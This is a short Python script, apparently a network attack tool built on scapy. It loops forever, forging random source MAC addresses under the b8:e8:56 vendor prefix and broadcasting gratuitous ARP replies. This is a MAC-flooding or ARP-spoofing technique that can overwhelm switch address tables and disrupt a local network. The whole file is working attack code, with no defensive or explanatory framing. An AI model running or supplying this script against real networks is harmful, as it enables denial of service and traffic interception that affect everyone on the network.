#!/usr/bin/env python
from scapy.all import *

vendor = "b8:e8:56:"
destMAC = "FF:FF:FF:FF:FF:FF"

while 1:
	randMAC = vendor + ':'.join(RandMAC().split(':')[3:])
	print randMAC
	sendp(Ether(src=randMAC ,dst=destMAC)/
	ARP(op=2, psrc="0.0.0.0", hwdst=destMAC)/Padding(load="X"*18),verbose=0)